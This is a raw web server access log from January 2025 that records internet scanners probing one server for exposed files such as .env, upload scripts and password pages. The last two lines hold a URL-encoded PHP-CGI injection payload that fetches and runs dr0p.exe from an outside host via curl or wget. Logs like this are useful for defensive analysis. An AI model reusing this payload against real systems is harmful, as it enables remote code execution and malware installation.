118.193.45.235 - - [07/Jan/2025:02:07:53 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/robots.txt" "Go-http-client/1.1"
193.34.212.75 - - [07/Jan/2025:02:14:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [07/Jan/2025:02:28:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:02:28:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [07/Jan/2025:03:03:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 9; MI 8 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044851 Mobile Safari/537.36 MMWEBID/2901 MicroMessenger/7.0.6.1460(0x2700066A) Process/tools NetType/4G Language/zh_CN"
159.223.145.32 - - [07/Jan/2025:03:16:29 +0000] "\x16\x03\x01" 400 528 "-" "-"
159.223.145.32 - - [07/Jan/2025:03:16:30 +0000] "\x16\x03\x01" 400 528 "-" "-"
159.223.145.32 - - [07/Jan/2025:03:16:30 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.145.32 - - [07/Jan/2025:03:16:30 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
159.223.145.32 - - [07/Jan/2025:03:16:30 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.223.145.32 - - [07/Jan/2025:03:16:30 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
159.223.145.32 - - [07/Jan/2025:03:16:30 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.145.32 - - [07/Jan/2025:03:16:31 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.145.32 - - [07/Jan/2025:03:16:31 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.145.32 - - [07/Jan/2025:03:16:31 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.145.32 - - [07/Jan/2025:03:16:31 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
87.120.125.13 - - [07/Jan/2025:03:19:32 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
87.120.125.13 - - [07/Jan/2025:03:19:43 +0000] "GET / HTTP/1.1" 200 947 "http://34.89.130.92/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>" "Go-http-client/1.1"
